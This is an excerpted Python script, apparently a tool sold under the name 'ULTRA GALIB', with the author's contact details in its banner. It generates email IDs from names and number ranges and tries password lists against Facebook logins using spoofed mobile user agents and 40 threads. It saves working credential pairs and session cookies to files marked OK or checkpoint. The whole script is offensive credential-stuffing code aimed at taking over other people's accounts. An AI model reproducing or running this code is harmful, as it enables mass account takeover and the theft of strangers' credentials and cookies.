...
for x in range(1000):
 rr = random.randint
 rc = random.choice
 A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; vivo {str(rr(4,9))} Build/PPR1.'
...
for xd in range(10000):
    ...
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, likGALIBko) NokiaBrowser/'
...
def banner():
  ...
  {H}  ║{P}[{H}•{P}] Facebook  : {H}Mahin Ahmed             {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+8801732978573         {N}{H}║
  ...
  {H}  ║{P}[{H}•{P}] Status    : {H}PREMIUM {P}     {N}      {H}     ║
   ...
   {H} ║{P}[{H}•{P}] Tools     : {H}ULTRA GALIB             ║
   {M} ╚════════════════════════════════════════╝ {P}""")
    print(f"""{GALIB}    SELL DONE{P}
...
def mainx():
    os.system("clear")
    banner()
    print(f"{K} [{H}1{K}] {WHITE}Gmail  Cloning {H}V1")
    print(f"{K} [{H}2{K}] {WHITE}Gmail  Cloning {H}V2")
...
def gf1(): 
    ...
    input('Press Enter To Go Menu');os.system('python CRAZY-GALIB.py')
def gf2(): 
    idf=[]
    os.system('clear');banner();print(fst);print(led)
    first = input(f'{dot}First Name {M}: {H}');print(led);print(lst);print(led)
    ...
    tkk = first+last
    banner()
    print(f"{dot}{P}Gmail Ids {RED}: {tkk[:4]}****{domain}")
    print(led)
    print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]')
    print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]')
    print(f' {K}[{H}3{K}] {P}Method [{H}M3 UPDATE{P}]')
    print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]')
    print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]')
    print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]')
    print(led)
    mthd = input(f'{wt}Select Method {M}:{H} ')
    for nmbr in range(limit):
    ...
    with tred(max_workers=40) as king_xd:
        ...
        os.system("clear")
        banner()
        print(f'{dot}Method    {RED}:{H} M-{mthd}-P-Auto')
        print(f'{dot}Gmail ids {RED}:{H} {tk[:4]}****{domain}')
        print(f'{dot}Total Ids {RED}: {H}'+idx)
        print(led)
        for number in idf:
            idf = first+'.'+last+number+domain
...
def m1(idf,pwv):
    ...
    rr = random.randint
    rc = random.choice
    ugen1 = f"Mozilla/5.0 (Linux; Android {str(rr(10,13))}; vivo Note 9 Pro Max Build/QKQ1.{str(rr(111111,999999))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Safari/537.36"
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             open(' /sdcard/ULTRA-GALIB-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
                ...
                ok+=1
                print(f'\r{P} [{H}KING-OK{P}] {GALIB}{idf}|{pw}{xxx}')
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis)
                open(' /sdcard/ULTRA-GALIN-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
...
def m2(idf,pwv):
 global loop,ok,cp
 animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
 sys.stdout.write(f'\r{P} [{animasi}-{H}M2{P}] ({B}%s{P}){U}+{H}OK{P}({GALIB}%s{P})'%(loop,ok)),
 sys.stdout.flush()
 ...
 for pw in pwv:
  try:
   ...
   if "checkpoint" in po.cookies.get_dict().keys():
    ...
    open(' /sdcard/ULTRA-GALIB-OK.txt','a').write(idf+'|'+pw+'\n')
    break
   else:
    continue
  except requests.exceptions.ConnectionError:
  ...
  for pw in pwv:
    try:
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        if 'y' in cp_xdx:
         print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
        open(' /sdcard/ULTRA-GALIB-CP.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        ...
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/ULTRA-GALIB-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
...
def m3(idf,pw):
 ...
 global agents
 animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
 sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M3{P}] ({B}%s{P}){U}+{H}OK{P}({GALIB}%s{P})'%(loop,ok)),
 try:
  for ps in pw:
   session = requests.Session()
   pro = random.choice(ugen)
   ...
   if 'c_user' in log_cookies:
    ...
    ok+=1 
    open(' /sdcard/ULTRA-GALIB-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
    ...
    open(' /sdcard/ULTRA-GALIB-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
...
def m5(idf,pw):
 ...
 global agents
 animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
 sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M5{P}] ({B}%s{P}){U}+{H}OK{P}({GALIB}%s{P})'%(loop,ok)),
 try:
  for ps in pw:
   session = requests.Session()
            #animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
